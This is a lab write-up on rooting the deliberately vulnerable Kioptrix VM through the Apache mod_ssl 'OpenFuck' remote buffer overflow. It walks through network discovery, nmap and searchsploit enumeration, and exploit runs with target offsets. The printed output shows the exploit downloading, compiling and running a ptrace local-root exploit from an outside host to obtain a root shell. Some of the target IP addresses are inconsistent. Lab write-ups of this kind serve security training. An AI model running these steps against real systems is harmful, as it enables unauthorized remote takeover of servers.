# Kioptrix Apache exploit write-up

Kioptrix is Virtual Machine with many exploits and now we are going to exploit it's one of exploit - Apache.



 > The target of this lab is use vulnerablitity in Apache service running in our Vulnerable VM to gain Root access.

## 1- Finding IP
 As the first step we are finding IP address of target machine - It's the VM located in our own LAN. 

 `sudo netdiscover -i eth 0` - for discovering all devices visible on ethernet 0.
```
 Currently scanning: 192.168.58.0/16   |   Screen View: Unique Hosts                                                        
                                                                                                                            
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 .
 192.168.43.219  00:0c:29:cd:26:47      2     120  VMware, Inc.
 .
 ```

 ## 2- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.219 ` - with nmap tool we get all the open ports running on unlnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
.
.
.
.
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
.
.
```
> Note the Version of apache 1.3.20 

Now to see some vulnerablities in machine, we use `searchspolit apache 1.3.20`

```
.
.
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)       | unix/remote/764.c
.
.
```

It suggest that we need to use OpenFuckV2 to exploit.

Before that, we'll need to download *openfuck.c* from https://www.exploit-db.com/exploits/764/.

Use command `wget https://www.exploit-db.com/exploits/764/`

There was guide to use openfuck.c on github https://github.com/exploit-inters/OpenFuck.

After installing libs and compiling - download the compiled and corrected file https://github.com/an0nym0us-rabbit/Kioptrix-1/blob/main/764.c , we'll head towards Expoliting.



## Exploiting

Run the `./OpenFuckV2`.

There was two exploits of our interest:
```
0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
```

As because our machine is running RedHat Linux. We can find this by using `Nikto -h 192.158.43.219`

Now just simply run these command one by one.

`/OpenFuck 0x6a 192.168.43.219`

`/OpenFuck 0x6b 192.168.43.219`


```
*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80fa068
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
--5:25:23--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/x-csrc]
0K ...                                                   100% @ 561.66 KB/s
05:25:24 (491.46 KB/s) - `ptrace-kmod.c' saved [4026]
gcc: file path prefix `/usr/bin' never used
[+] Attached to 2363
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
whoami
root
```


**ROOTED**

